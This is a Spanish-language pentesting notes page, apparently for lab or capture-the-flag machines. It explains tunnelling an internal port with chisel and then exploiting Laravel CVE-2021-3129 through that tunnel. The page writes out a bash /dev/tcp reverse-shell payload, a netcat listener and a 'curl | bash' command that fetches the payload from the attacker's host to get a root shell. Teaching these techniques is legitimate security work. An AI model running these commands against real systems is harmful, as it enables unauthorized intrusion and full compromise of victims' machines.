---
icon: right-to-line
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Port Forwarding

## <mark style="color:purple;">Port Forwarding</mark>

Si en una de las maquinas encontramos algun puerto `8000` de forma interna con un `Lavel v8` u otra version que pueda ser explotable, podemos hacer esta tecnica con lagunos repositorios de GitHub o para algun otro puerto que queramos transladar a nuestro `Host` para operar desde ahi ya que sirve para lo mencionado anteriormente (Esta tecnica sirve para transladar algun puerto o depende de lo que quieras hacer a tu `Host` para operar desde ahi mas facilmente)

URL = [Chisel Pagina](https://github.com/jpillora/chisel)

Utilizaremos la herramienta `chisel` que es la mas utilizada para este tipo de tecnicas y sirve para abrirnos una especie de servidor para que podamos interactuar desde nuestro `Host` como si fuera una `Reverse Shell` haciendo una especie de `tunel` hacia tu `host`...

Una vez clonado en tu maquina `host` hacemos lo siguiente para montarlo...

```shell
go build -ldflags "-s -w" .
```

```shell
upx chisel
```

Con el siguiente comando veremos lo que pesa la herramienta `chisel`...

```shell
du -hc chisel
```

Por lo que abrimos un servidor de `python3` para pasarnos el `chisel` a nuestra maquina victima...

```shell
python3 -m http.server 80
```

> Maquina victima

```shell
wget http://<IP>/chisel
```

```shell
chmod +x chisel
```

Ya ahora para pasarnos el puerto que queremos por ejemplo el puerto `8000` a nuestra maquina `Host` haremos lo siguiente...

> Maquina Host

```shell
./chisel <SERVER_NAME> --reverse -p <PORT>
```

```shell
./chisel server --reverse -p 1234
```

Donde pone `server` es el nombre que le quieras dar a tu "Servidor" y despues de `-p` ponemos el puerto al que queremos abrir el server por ejemplo el `1234`...

Y con eso ya estaria montado el servidor y abierto...

> Maquina victima

```shell
./chisel client <IP>:<SERVER_PORT> R:<TRANSFER_PORT>:127.0.0.1:<PORT>
```

Adaptandolo a nuestro ejemplo quedaria de la siguiente manera...

```shell
./chisel client <IP>:1234 R:8000:127.0.0.1:8000
```

Lo que estamos haciendo aqui es conectarnos desde la maquina victima de tipo `cliente` a nuestra `IP` de la maquina `Host` donde tenemos el servidor corriendo en el puerto `1234` de manera que el parametro `R:` significa que nos estamos pasando en forma de tunel el puerto `8000` de la maquina victima con la `IP` del `localhost` a nuestro puerto `8000` de la maquina `Host`, por lo que una vez echo esto si nos vamos a nuestra maquina `Host` y buscamos por el puerto `8000` en este caso pertenece a una pagina web...

```
URL = http://127.0.0.1:8000/
```

Nos mostrara el contenido del puerto `8000` que contiene la maquina victima...

Por lo que si tiene alguna vulnerabilidad podremos explotarla desde nuestro `Host`...

> EJEMPLO

Si esta pagina tiene un `CMS` llamado `Laravel v8` como ya dije anteriormente puede ser ecplotado por un exploit de GitHub, ya que lo esta ejecutando `root` desde la maquina victima...

URL = https://github.com/nth347/CVE-2021-3129\_exploit

Si esto nos lo clonamos en nuestro `Host` y lo explotamos desde nuestro `Host` lo estaremos haciendo como si fuera en la maquina victima y como lo esta ejecutando `root` podremos ser `root` ya que todo lo que toquemos en ese puerto transformado en un tunel se ejecutara en la maquina victima...

```shell
python3 exploit.py http://127.0.0.1:<TUNEL_PORT> Monolog/RCE1 <COMMAND>
```

```shell
python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 whoami
```

```shell
python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 'ifconfig'
```

Con el `ifconfig` veremos la `IP` de la maquina victima con esto ya confirmamos que se esta ejecutando desde la maquina victima...

Y si todo funciona veremos que es `root` el que lo esta ejecutando, por lo que haremos una `Reverse Shell` con `curl`...

Crearemos el archivo `index.html`...

```shell
nano index.html

#Contenido del nano

#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Guardamos el archivo y ahora lo ejecutaremos desde `curl` con el exploit el cual nos deja ejecutar comandos...

Donde tengamos el archivo abrimos un servidor de `python3` de la siguiente manera...

```shell
python3 -m http.server 80
```

Una vez hecho eso, estaremos a la escucha...

```shell
nc -nlvp <PORT>
```

Y por ultimo lo ejecutaremos con `curl` de la siguiente forma mediante el exploit...

```shell
curl http://<IP>/ | bash
```

Y con esto ya tendriamos la shell autenticada como `root` ya que lo esta ejecutando el usuario `root` todo esto y como si se estuviera ejecutando desde la maquina victima...
